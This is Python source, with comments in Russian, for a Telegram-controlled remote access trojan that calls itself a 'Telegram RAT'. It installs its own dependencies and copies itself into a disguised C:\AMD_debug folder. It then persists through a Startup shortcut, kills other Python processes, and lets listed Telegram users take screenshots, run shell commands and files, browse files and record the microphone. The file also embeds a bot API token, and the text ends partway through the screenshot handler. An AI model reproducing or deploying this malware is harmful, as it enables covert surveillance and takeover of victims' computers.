import sys
import subprocess

def ensure_package(pkg):
    try:
        __import__(pkg)
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", pkg])

for pkg in ["telebot", "mss", "psutil", "winotify", "pyaudio", "wave", "Pillow", "pywin32", "pygame"]:
    ensure_package(pkg)
import telebot
from telebot import types
import mss
import tempfile
import psutil
import subprocess
import os
import tkinter
import base64
import string
import sys
import html
import threading
import time
import pyaudio
import wave
from PIL import Image

# Tkinter –¥–ª—è –∫–∞—Å—Ç–æ–º–Ω—ã—Ö —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π
import tkinter as tk
from tkinter import ttk

# –ù–∞—Å—Ç—Ä–æ–π–∫–∏ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π
ShowNotifications = False
#
#  --self
API_TOKEN = '7851168987:AAHo0NfMHNKsMSTmkb9iJkBAoi-IYWAX49U'
ALLOWED_USER_ID = [7580867752, 7101839784, 5320203732, 7723026733]

# –¢–∞–±–ª–∏—Ü–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π —Å –∫–∞—Å—Ç–æ–º–Ω—ã–º–∏ –Ω–∏–∫–∞–º–∏
USER_NICKS = {
    7580867752: "–¥–∞–∫",
    5320203732: "—Ç–∏–≥—Ä—ë–Ω–æ–∫", 
    7723026733: "–∞–∫—É :3",
    7101839784: "realuzoth"
}

USER_RESTRICTIONS = {
    7580867752: ['üìÇ –í—ã–ø–æ–ª–Ω–∏—Ç—å —Ñ–∞–π–ª', 'üóÇ –ü—Ä–æ–≤–æ–¥–Ω–∏–∫', 'üîÑ –ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å –ü–ö', '‚èπ –í—ã–∫–ª—é—á–∏—Ç—å –ü–ö']
}

AMD_DEBUG_PATH = r"C:\AMD_debug"

bot = telebot.TeleBot(API_TOKEN)

user_paths = {}
PAGE_SIZE = 10


notification_count = 0

# –°–ø–∏—Å–æ–∫ –∞–∫—Ç–∏–≤–Ω—ã—Ö —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π –¥–ª—è —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –∏–º–∏
active_notifications = []


def encode_path(path):
    return base64.urlsafe_b64encode(path.encode()).decode()

def decode_path(data):
    return base64.urlsafe_b64decode(data.encode()).decode()

def list_drives():
    if sys.platform == 'win32':
        from ctypes import windll
        drives = []
        bitmask = windll.kernel32.GetLogicalDrives()
        for letter in string.ascii_uppercase:
            if bitmask & 1:
                drives.append(f'{letter}:\\')
            bitmask >>= 1
        return drives
    else:
        return ['/']

def get_size(path):
    try:
        if os.path.isfile(path):
            return os.path.getsize(path)
        total_size = 0
        for dirpath, dirnames, filenames in os.walk(path):
            for f in filenames:
                fp = os.path.join(dirpath, f)
                try:
                    total_size += os.path.getsize(fp)
                except Exception:
                    pass
        return total_size
    except Exception:
        return 0

def human_size(size):
    for unit in ['–ë','–ö–ë','–ú–ë','–ì–ë','–¢–ë']:
        if size < 1024:
            return f"{size:.1f} {unit}"
        size /= 1024
    return f"{size:.1f} –ü–ë"

def escape_html(text):
    return html.escape(text)

# –°–∏—Å—Ç–µ–º–∞ –∫–∞—Å—Ç–æ–º–Ω—ã—Ö —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π –∫–∞–∫ –≤ Telegram
class NotificationWindow:
    def __init__(self, title, message, icon="üîî"):
        # –°–æ–∑–¥–∞–µ–º –≥–ª–∞–≤–Ω–æ–µ –æ–∫–Ω–æ –±–µ–∑ —Ä–æ–¥–∏—Ç–µ–ª—è
        self.root = tk.Tk()
        
        # –ù–∞—Å—Ç—Ä–æ–π–∫–∏ –æ–∫–Ω–∞ - –ø–æ–ª–Ω–æ—Å—Ç—å—é –Ω–µ–∏–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–Ω–æ–µ
        self.root.overrideredirect(True)  # –£–±–∏—Ä–∞–µ–º —Ä–∞–º–∫—É –∏ –∑–∞–≥–æ–ª–æ–≤–æ–∫
        self.root.attributes('-topmost', True)  # –ü–æ–≤–µ—Ä—Ö –≤—Å–µ—Ö –æ–∫–æ–Ω
        self.root.attributes('-alpha', 0.95)  # –ü—Ä–æ–∑—Ä–∞—á–Ω–æ—Å—Ç—å
        self.root.attributes('-disabled', True)  # –û—Ç–∫–ª—é—á–∞–µ–º –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏–µ
        self.root.attributes('-toolwindow', True)  # –£–±–∏—Ä–∞–µ–º –∏–∑ –ø–∞–Ω–µ–ª–∏ –∑–∞–¥–∞—á
        self.root.configure(bg='#2D2D2D')  # –¢–µ–º–Ω—ã–π —Ñ–æ–Ω
        
        # –ü–æ–∑–∏—Ü–∏–æ–Ω–∏—Ä—É–µ–º –≤ –ø—Ä–∞–≤–æ–º –Ω–∏–∂–Ω–µ–º —É–≥–ª—É
        screen_width = self.root.winfo_screenwidth()
        screen_height = self.root.winfo_screenheight()
        window_width = 380
        window_height = 90
        x = screen_width - window_width - 20
        y = screen_height - window_height - 20
        
        self.root.geometry(f"{window_width}x{window_height}+{x}+{y}")
        
        # –°–æ–∑–¥–∞–µ–º –æ—Å–Ω–æ–≤–Ω–æ–π —Ñ—Ä–µ–π–º —Å –∫—Ä–∞—Å–∏–≤–æ–π —Ä–∞–º–∫–æ–π
        main_frame = tk.Frame(self.root, bg='#404040', relief='flat', bd=2)
        main_frame.pack(fill='both', expand=True, padx=1, pady=1)
        
        # –°–æ–∑–¥–∞–µ–º –≤–Ω—É—Ç—Ä–µ–Ω–Ω–∏–π —Ñ—Ä–µ–π–º —Å —Ç–µ–Ω—å—é
        inner_frame = tk.Frame(main_frame, bg='#2D2D2D', relief='flat', bd=0)
        inner_frame.pack(fill='both', expand=True, padx=2, pady=2)
        
        # –°–æ–∑–¥–∞–µ–º layout
        content_frame = tk.Frame(inner_frame, bg='#2D2D2D')
        content_frame.pack(fill='both', expand=True, padx=15, pady=10)
        
        # –ò–∫–æ–Ω–∫–∞
        icon_label = tk.Label(content_frame, text=icon, font=('Arial', 24), 
                             bg='#2D2D2D', fg='#4CAF50')
        icon_label.pack(side='left', padx=(0, 15))
        
        # –¢–µ–∫—Å—Ç–æ–≤–∞—è –æ–±–ª–∞—Å—Ç—å
        text_frame = tk.Frame(content_frame, bg='#2D2D2D')
        text_frame.pack(side='left', fill='both', expand=True)
        
        # –ó–∞–≥–æ–ª–æ–≤–æ–∫
        title_label = tk.Label(text_frame, text=title, font=('Arial', 12, 'bold'), 
                              bg='#2D2D2D', fg='white', anchor='w')
        title_label.pack(fill='x', pady=(0, 2))
        
        # –°–æ–æ–±—â–µ–Ω–∏–µ
        message_label = tk.Label(text_frame, text=message, font=('Arial', 10), 
                                bg='#2D2D2D', fg='#E0E0E0', anchor='w', wraplength=280)
        message_label.pack(fill='x')
        
        # –û—Ç–∫–ª—é—á–∞–µ–º –≤—Å–µ –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏–µ —Å —ç–ª–µ–º–µ–Ω—Ç–∞–º–∏
        for widget in [main_frame, inner_frame, content_frame, icon_label, text_frame, title_label, message_label]:
            widget.bind('<Button-1>', lambda e: 'break')
            widget.bind('<Key>', lambda e: 'break')
            widget.bind('<FocusIn>', lambda e: 'break')
        
        # –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –æ–∫–Ω–æ
        self.root.lift()
        
        # –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–µ –∑–∞–∫—Ä—ã—Ç–∏–µ —á–µ—Ä–µ–∑ 5 —Å–µ–∫—É–Ω–¥
        self.root.after(5000, self.close_notification)
        
    def close_notification(self):
        # –ê–Ω–∏–º–∞—Ü–∏—è –∏—Å—á–µ–∑–Ω–æ–≤–µ–Ω–∏—è
        def fade_out():
            for i in range(20, -1, -1):
                self.root.attributes('-alpha', i / 20.0)
                time.sleep(0.05)
            self.root.destroy()
        
        threading.Thread(target=fade_out, daemon=True).start()

def get_user_nick(user_id):
    """–ü–æ–ª—É—á–∏—Ç—å –Ω–∏–∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –ø–æ ID"""
    return USER_NICKS.get(user_id, f"User{user_id}")

def hide_all_notifications():
    """–°–∫—Ä—ã—Ç—å –≤—Å–µ –∞–∫—Ç–∏–≤–Ω—ã–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è"""
    global active_notifications
    for notification in active_notifications[:]:  # –ö–æ–ø–∏—Ä—É–µ–º —Å–ø–∏—Å–æ–∫ –¥–ª—è –±–µ–∑–æ–ø–∞—Å–Ω–æ–π –∏—Ç–µ—Ä–∞—Ü–∏–∏
        try:
            if notification and notification.root and notification.root.winfo_exists():
                notification.root.withdraw()  # –°–∫—Ä—ã–≤–∞–µ–º –æ–∫–Ω–æ
        except:
            pass
    active_notifications.clear()

def show_notification(title, message, icon="üîî"):
    """–ü–æ–∫–∞–∑–∞—Ç—å –∫–∞—Å—Ç–æ–º–Ω–æ–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –∫–∞–∫ –≤ Telegram"""
    global notification_count, ShowNotifications
    
    if not ShowNotifications:
        return
    
    def create_notification():
        global notification_count, active_notifications
        try:
            notification_count += 1
            print(f"üîî –£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ #{notification_count}: {title} - {message}")
            
            # –°–æ–∑–¥–∞–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ
            notification = NotificationWindow(title, message, icon)
            
            # –î–æ–±–∞–≤–ª—è–µ–º –≤ —Å–ø–∏—Å–æ–∫ –∞–∫—Ç–∏–≤–Ω—ã—Ö —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π
            active_notifications.append(notification)
            
            # –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º —Å–æ–±—ã—Ç–∏—è tkinter
            notification.root.mainloop()
            
            # –£–¥–∞–ª—è–µ–º –∏–∑ —Å–ø–∏—Å–∫–∞ –∞–∫—Ç–∏–≤–Ω—ã—Ö —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π –ø–æ—Å–ª–µ –∑–∞–∫—Ä—ã—Ç–∏—è
            if notification in active_notifications:
                active_notifications.remove(notification)
                
        except Exception as e:
            print(f"‚ùå –û—à–∏–±–∫–∞ –ø–æ–∫–∞–∑–∞ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è: {e}")
    
    # –ó–∞–ø—É—Å–∫–∞–µ–º –≤ –æ—Ç–¥–µ–ª—å–Ω–æ–º –ø–æ—Ç–æ–∫–µ
    threading.Thread(target=create_notification, daemon=True).start()

def init_qt_app():
    """–ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è (–∑–∞–≥–ª—É—à–∫–∞ –¥–ª—è —Å–æ–≤–º–µ—Å—Ç–∏–º–æ—Å—Ç–∏)"""
    pass

def setup_amd_debug_folder():
    """–°–æ–∑–¥–∞–µ—Ç –ø–∞–ø–∫—É AMD_debug –∏ –ø–µ—Ä–µ–º–µ—â–∞–µ—Ç —Ç—É–¥–∞ —Å–∫—Ä–∏–ø—Ç"""
    try:
        import shutil
        
        # –°–æ–∑–¥–∞–µ–º –ø–∞–ø–∫—É AMD_debug –µ—Å–ª–∏ –µ—ë –Ω–µ—Ç
        if not os.path.exists(AMD_DEBUG_PATH):
            os.makedirs(AMD_DEBUG_PATH)
            print(f"‚úÖ –°–æ–∑–¥–∞–Ω–∞ –ø–∞–ø–∫–∞: {AMD_DEBUG_PATH}")
        
        # –ü–æ–ª—É—á–∞–µ–º —Ç–µ–∫—É—â–∏–π –ø—É—Ç—å —Å–∫—Ä–∏–ø—Ç–∞
        current_path = os.path.abspath(__file__)
        target_path = os.path.join(AMD_DEBUG_PATH, "aganee.pyw")
        
        # –ï—Å–ª–∏ —Å–∫—Ä–∏–ø—Ç —É–∂–µ –≤ –Ω—É–∂–Ω–æ–º –º–µ—Å—Ç–µ, –ø—Ä–æ–ø—É—Å–∫–∞–µ–º
        if current_path.lower() == target_path.lower():
            return target_path
        
        # –ö–æ–ø–∏—Ä—É–µ–º —Å–∫—Ä–∏–ø—Ç –≤ AMD_debug
        shutil.copy2(current_path, target_path)
        print(f"‚úÖ –°–∫—Ä–∏–ø—Ç –ø–µ—Ä–µ–º–µ—â–µ–Ω –≤: {target_path}")
        
        # –£–¥–∞–ª—è–µ–º —Å—Ç–∞—Ä—ã–π —Ñ–∞–π–ª –µ—Å–ª–∏ –æ–Ω –Ω–µ –≤ AMD_debug
        if current_path.lower() != target_path.lower():
            try:
                os.remove(current_path)
                print(f"‚úÖ –°—Ç–∞—Ä—ã–π —Ñ–∞–π–ª —É–¥–∞–ª–µ–Ω: {current_path}")
            except:
                pass
        
        return target_path
        
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ AMD_debug: {e}")
        return os.path.abspath(__file__)

def cleanup_startup_links(allowed_script_path=None):
    """–£–¥–∞–ª—è–µ—Ç –∏–∑ Startup –≤—Å–µ —è—Ä–ª—ã–∫–∏/–±–∞—Ç–Ω–∏–∫–∏, –≤–µ–¥—É—â–∏–µ –Ω–∞ .py/.pyw, –∫—Ä–æ–º–µ —Ç–µ–∫—É—â–µ–≥–æ —Å–∫—Ä–∏–ø—Ç–∞."""
    try:
        from pathlib import Path
        startup_folder = Path.home() / "AppData" / "Roaming" / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"

        allowed = None
        if allowed_script_path:
            try:
                allowed = os.path.abspath(allowed_script_path).lower()
            except Exception:
                allowed = str(allowed_script_path).lower()

        # 1) –£–¥–∞–ª—è–µ–º .lnk, –∫–æ—Ç–æ—Ä—ã–µ —Å—Å—ã–ª–∞—é—Ç—Å—è –Ω–∞ .py/.pyw –∏ –Ω–µ —Ä–∞–≤–Ω—ã allowed
        try:
            import pythoncom  # noqa: F401
            import win32com.client
            shell = win32com.client.Dispatch('WScript.Shell')

            for lnk in startup_folder.glob('*.lnk'):
                try:
                    sc = shell.CreateShortcut(str(lnk))
                    target = (sc.TargetPath or '').strip()
                    args = (sc.Arguments or '').strip()
                    target_l = target.lower()
                    args_l = args.lower()

                    referenced_script = None

                    if target_l.endswith('.py') or target_l.endswith('.pyw'):
                        referenced_script = os.path.abspath(target).lower()
                    else:
                        # –Ø—Ä–ª—ã–∫ –Ω–∞ python/pythonw.exe ‚Äî –ø—ã—Ç–∞–µ–º—Å—è –∏–∑–≤–ª–µ—á—å –ø—É—Ç—å –∫ .py/.pyw –∏–∑ –∞—Ä–≥—É–º–µ–Ω—Ç–æ–≤
                        if target_l.endswith('python.exe') or target_l.endswith('pythonw.exe'):
                            # –ü—Ä–æ—Å—Ç–∞—è —ç–≤—Ä–∏—Å—Ç–∏–∫–∞: –±–µ—Ä–µ–º –ø–µ—Ä–≤–æ–µ "...py[w]" –∏–∑ –∞—Ä–≥—É–º–µ–Ω—Ç–æ–≤
                            candidate = None
                            if '.pyw' in args_l or '.py' in args_l:
                                # –ü–æ–ø—Ä–æ–±—É–µ–º –≤—ã–¥–µ–ª–∏—Ç—å —Ç–æ–∫–µ–Ω –≤ –∫–∞–≤—ã—á–∫–∞—Ö
                                import re
                                m = re.search(r'"([^"]+\.pyw?)"', args_l)
                                if m:
                                    candidate = m.group(1)
                                else:
                                    # –ë–µ–∑ –∫–∞–≤—ã—á–µ–∫ ‚Äî –±–µ—Ä–µ–º —Å–ª–æ–≤–æ —Å .py/.pyw
                                    for part in args.split():
                                        if part.lower().endswith('.py') or part.lower().endswith('.pyw'):
                                            candidate = part
                                            break
                            if candidate:
                                try:
                                    referenced_script = os.path.abspath(candidate).lower()
                                except Exception:
                                    referenced_script = candidate.lower()

                    if referenced_script and (allowed is None or referenced_script != allowed):
                        try:
                            lnk.unlink()
                            print(f"‚úÖ –£–¥–∞–ª–µ–Ω —è—Ä–ª—ã–∫ –Ω–∞ Python-—Å–∫—Ä–∏–ø—Ç: {lnk.name}")
                        except Exception:
                            pass
                except Exception:
                    continue
        except Exception:
            pass

        # 2) –£–¥–∞–ª—è–µ–º .bat, –∫–æ—Ç–æ—Ä—ã–µ –∑–∞–ø—É—Å–∫–∞—é—Ç python .py/.pyw –∏ –Ω–µ —Ä–∞–≤–Ω—ã allowed
        for file in startup_folder.glob("*.bat"):
            try:
                with open(file, 'r', encoding='utf-8') as f:
                    content = f.read()
                    content_l = content.lower()
                    if 'python' in content_l and ('.py' in content_l or '.pyw' in content_l):
                        if allowed and allowed in content_l:
                            continue
                        file.unlink()
                        print(f"‚úÖ –£–¥–∞–ª–µ–Ω –∞–≤—Ç–æ–∑–∞–ø—É—Å–∫ (.bat): {file.name}")
            except Exception:
                pass

    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞ –æ—á–∏—Å—Ç–∫–∏ Startup: {e}")

def create_startup_link(script_path):
    """–°–æ–∑–¥–∞–µ—Ç .lnk —è—Ä–ª—ã–∫ –Ω–∞ —Å–∞–º —Å–∫—Ä–∏–ø—Ç –≤ –ø–∞–ø–∫–µ Startup (–±–µ–∑ .bat)."""
    try:
        from pathlib import Path
        import pythoncom  # noqa: F401 (–∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è COM)
        import win32com.client

        startup_folder = Path.home() / "AppData" / "Roaming" / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
        startup_folder.mkdir(parents=True, exist_ok=True)

        script_name = os.path.basename(script_path).replace('.pyw', '').replace('.py', '')
        lnk_path = startup_folder / f"{script_name}.lnk"

        # –ù–∞ –≤—Å—è–∫–∏–π —Å–ª—É—á–∞–π —É–¥–∞–ª–∏–º —Å—Ç–∞—Ä—ã–π .bat, –µ—Å–ª–∏ –±—ã–ª
        bat_path = startup_folder / f"{script_name}.bat"
        try:
            if bat_path.exists():
                bat_path.unlink()
        except Exception:
            pass

        shell = win32com.client.Dispatch('WScript.Shell')
        shortcut = shell.CreateShortcut(str(lnk_path))
        # –ó–∞–ø—É—Å–∫–∞–µ–º –Ω–∞–ø—Ä—è–º—É—é —Å–∞–º .pyw ‚Äî –∞—Å—Å–æ—Ü–∏–∞—Ü–∏—è .pyw –æ—Ç–∫—Ä—ã–≤–∞–µ—Ç pythonw.exe –±–µ–∑ –∫–æ–Ω—Å–æ–ª–∏
        shortcut.TargetPath = str(script_path)
        shortcut.WorkingDirectory = str(Path(script_path).parent)
        shortcut.WindowStyle = 7  # SW_SHOWMINNOACTIVE
        shortcut.IconLocation = str(script_path)
        shortcut.Description = "uwurat autostart"
        shortcut.save()

        print(f"‚úÖ –°–æ–∑–¥–∞–Ω —è—Ä–ª—ã–∫ –∞–≤—Ç–æ–∑–∞–ø—É—Å–∫–∞: {lnk_path}")
        return True

    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞ —Å–æ–∑–¥–∞–Ω–∏—è —è—Ä–ª—ã–∫–∞ –≤ Startup: {e}")
        return False

def kill_other_python_processes():
    """–û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç –≤—Å–µ Python –ø—Ä–æ—Ü–µ—Å—Å—ã –∫—Ä–æ–º–µ —Ç–µ–∫—É—â–µ–≥–æ"""
    try:
        import psutil
        current_pid = os.getpid()
        current_script = os.path.abspath(__file__)
        
        killed_count = 0
        
        for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
            try:
                # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ç–æ–ª—å–∫–æ Python –ø—Ä–æ—Ü–µ—Å—Å—ã
                if proc.info['name'] and 'python' in proc.info['name'].lower():
                    # –ü—Ä–æ–ø—É—Å–∫–∞–µ–º —Ç–µ–∫—É—â–∏–π –ø—Ä–æ—Ü–µ—Å—Å
                    if proc.info['pid'] == current_pid:
                        continue
                    
                    # –ü—Ä–æ–≤–µ—Ä—è–µ–º –∫–æ–º–∞–Ω–¥–Ω—É—é —Å—Ç—Ä–æ–∫—É
                    cmdline = proc.info.get('cmdline', [])
                    if cmdline:
                        cmdline_str = ' '.join(cmdline).lower()
                        
                        # –ü—Ä–æ–ø—É—Å–∫–∞–µ–º –µ—Å–ª–∏ —ç—Ç–æ –Ω–∞—à —Å–∫—Ä–∏–ø—Ç
                        if current_script.lower() in cmdline_str:
                            continue
                        
                        # –ü—Ä–æ–ø—É—Å–∫–∞–µ–º —Å–∏—Å—Ç–µ–º–Ω—ã–µ Python –ø—Ä–æ—Ü–µ—Å—Å—ã
                        if any(skip in cmdline_str for skip in ['pip', 'conda', 'jupyter', 'spyder', 'pycharm']):
                            continue
                        
                        # –£–±–∏–≤–∞–µ–º –ø—Ä–æ—Ü–µ—Å—Å
                        proc.terminate()
                        killed_count += 1
                        print(f"üîÑ –û—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω Python –ø—Ä–æ—Ü–µ—Å—Å: PID {proc.info['pid']}")
                        
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass
        
        if killed_count > 0:
            print(f"‚úÖ –û—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ {killed_count} Python –ø—Ä–æ—Ü–µ—Å—Å–æ–≤")
        else:
            print("‚ÑπÔ∏è –î—Ä—É–≥–∏—Ö Python –ø—Ä–æ—Ü–µ—Å—Å–æ–≤ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ")
            
    except ImportError:
        print("‚ö†Ô∏è –ú–æ–¥—É–ª—å psutil –Ω–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω, –∏—Å–ø–æ–ª—å–∑—É–µ–º taskkill")
        # Fallback —á–µ—Ä–µ–∑ taskkill
        try:
            result = subprocess.run(['taskkill', '/f', '/im', 'python.exe'], 
                                  capture_output=True, text=True, shell=True)
            if result.returncode == 0:
                print("‚úÖ Python –ø—Ä–æ—Ü–µ—Å—Å—ã –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω—ã —á–µ—Ä–µ–∑ taskkill")
        except:
            pass
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞ –æ—Å—Ç–∞–Ω–æ–≤–∫–∏ Python –ø—Ä–æ—Ü–µ—Å—Å–æ–≤: {e}")

def get_user_buttons(user_id):
    """–í–æ–∑–≤—Ä–∞—â–∞–µ—Ç —Å–ø–∏—Å–æ–∫ –¥–æ—Å—Ç—É–ø–Ω—ã—Ö –∫–Ω–æ–ø–æ–∫ –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è —Å —É—á–µ—Ç–æ–º –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–π"""
    all_buttons = [
        'üñº –°–∫—Ä–∏–Ω—à–æ—Ç', 'üóÇ –ü—Ä–æ—Ü–µ—Å—Å—ã', 'üíª Cmd', 'üîÑ –ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å –ü–ö',
        '‚èπ –í—ã–∫–ª—é—á–∏—Ç—å –ü–ö', 'üìÇ –í—ã–ø–æ–ª–Ω–∏—Ç—å —Ñ–∞–π–ª', 'üóÇ –ü—Ä–æ–≤–æ–¥–Ω–∏–∫', 'üåê –°—Å—ã–ª–∫–∞',
        'üé§ –ó–∞–ø–∏—Å–∞—Ç—å –º–∏–∫—Ä–æ—Ñ–æ–Ω', 'üé¨ –ó–∞–ø–∏—Å–∞—Ç—å GIF', 'üí¨ Popup —Å–æ–æ–±—â–µ–Ω–∏–µ', 'üîä –í–æ—Å–ø—Ä–æ–∏–∑–≤–µ—Å—Ç–∏ –∑–≤—É–∫', 'üîÑ Update', '‚ûñ –°–≤–µ—Ä–Ω—É—Ç—å –≤—Å—ë'
    ]
    
    # –ü–æ–ª—É—á–∞–µ–º –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏—è –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
    restrictions = USER_RESTRICTIONS.get(user_id, [])
    
    # –§–∏–ª—å—Ç—Ä—É–µ–º –∫–Ω–æ–ø–∫–∏, —É–±–∏—Ä–∞—è –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ
    available_buttons = [btn for btn in all_buttons if btn not in restrictions]
    
    return available_buttons

def update_main_keyboard(user_id=None):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    
    # –ü–æ–ª—É—á–∞–µ–º –¥–æ—Å—Ç—É–ø–Ω—ã–µ –∫–Ω–æ–ø–∫–∏ –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
    if user_id:
        available_buttons = get_user_buttons(user_id)
    else:
        available_buttons = [
            'üñº –°–∫—Ä–∏–Ω—à–æ—Ç', 'üóÇ –ü—Ä–æ—Ü–µ—Å—Å—ã', 'üíª Cmd', 'üîÑ –ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å –ü–ö',
            '‚èπ –í—ã–∫–ª—é—á–∏—Ç—å –ü–ö', 'üìÇ –í—ã–ø–æ–ª–Ω–∏—Ç—å —Ñ–∞–π–ª', 'üóÇ –ü—Ä–æ–≤–æ–¥–Ω–∏–∫', 'üåê –°—Å—ã–ª–∫–∞',
            'üé§ –ó–∞–ø–∏—Å–∞—Ç—å –º–∏–∫—Ä–æ—Ñ–æ–Ω', 'üé¨ –ó–∞–ø–∏—Å–∞—Ç—å GIF', 'üí¨ Popup —Å–æ–æ–±—â–µ–Ω–∏–µ', 'üîä –í–æ—Å–ø—Ä–æ–∏–∑–≤–µ—Å—Ç–∏ –∑–≤—É–∫', 'üîÑ Update', '‚ûñ –°–≤–µ—Ä–Ω—É—Ç—å –≤—Å—ë'
        ]
    
    # –°–æ–∑–¥–∞–µ–º –∫–Ω–æ–ø–∫–∏ —Ç–æ–ª—å–∫–æ –¥–ª—è –¥–æ—Å—Ç—É–ø–Ω—ã—Ö —Ñ—É–Ω–∫—Ü–∏–π
    buttons = []
    for button_text in available_buttons:
        buttons.append(types.KeyboardButton(button_text))
    
    # –†–∞—Å–ø–æ–ª–∞–≥–∞–µ–º –∫–Ω–æ–ø–∫–∏ –≤ —É–¥–æ–±–Ω–æ–º –ø–æ—Ä—è–¥–∫–µ
    if len(buttons) >= 3:
        markup.add(buttons[0], buttons[1], buttons[2])
    if len(buttons) >= 6:
        markup.add(buttons[3], buttons[4], buttons[5])
    if len(buttons) >= 9:
        markup.add(buttons[6], buttons[7], buttons[8])
    if len(buttons) >= 11:
        markup.add(buttons[9], buttons[10])
    if len(buttons) > 11:
        markup.add(buttons[11])
    
    return markup

@bot.message_handler(commands=['start'])
def handle_start(message):
    try:
        if message.from_user.id in ALLOWED_USER_ID:
            bot.send_message(message.chat.id, '–ü—Ä–∏–≤–µ—Ç! –Ø –≤–∞—à Telegram RAT.', reply_markup=update_main_keyboard(message.from_user.id))
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞ –≤ handle_start: {e}")

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–æ–º–∞–Ω–¥—ã —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è–º–∏
@bot.message_handler(func=lambda message: message.from_user.id in ALLOWED_USER_ID and message.text and message.text.startswith('notif '))
def notification_command_handler(message):
    global ShowNotifications
    
    try:
        command = message.text.strip().lower()
        
        if command == 'notif true':
            ShowNotifications = True
            bot.send_message(message.chat.id, '‚úÖ –£–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –≤–∫–ª—é—á–µ–Ω—ã')
        elif command == 'notif false':
            ShowNotifications = False
            bot.send_message(message.chat.id, '‚ùå –£–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –æ—Ç–∫–ª—é—á–µ–Ω—ã')
        else:
            bot.send_message(message.chat.id, '‚ùå –ù–µ–≤–µ—Ä–Ω–∞—è –∫–æ–º–∞–Ω–¥–∞. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ: notif true –∏–ª–∏ notif false')
            
    except Exception as e:
        bot.send_message(message.chat.id, f'‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –∏–∑–º–µ–Ω–µ–Ω–∏–∏ –Ω–∞—Å—Ç—Ä–æ–µ–∫ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π: {e}')


@bot.message_handler(func=lambda message: message.from_user.id in ALLOWED_USER_ID and message.text == 'üñº –°–∫—Ä–∏–Ω—à–æ—Ç')
def screenshot_handler(message):
    try:
        sent_msg = bot.send_message(message.chat.id, '–î–µ–ª–∞—é —Å–∫—Ä–∏–Ω—à–æ—Ç...')
        
        # –°–∫—Ä—ã–≤–∞–µ–º –≤—Å–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –ø–µ—Ä–µ–¥ —Å–∫—Ä–∏–Ω—à–æ—Ç–æ–º
        hide_all_notifications()
        
        with mss.mss() as sct:
            monitor = sct.monitors[1]  # –æ—Å–Ω–æ–≤–Ω–æ–π –º–æ–Ω–∏—Ç–æ—Ä
            with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as tmpfile:
                sct.shot(mon=1, output=tmpfile.name)
                bot.send_photo(message.chat.id, open(tmpfile.name, 'rb'))
        bot.delete_message(message.chat.id, sent_msg.message_id)
        
        # –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –ø–æ—Å–ª–µ —Å–∫—Ä–∏–Ω—à–æ—Ç–∞
        user_nick = get_user_nick(message.from_user.id)
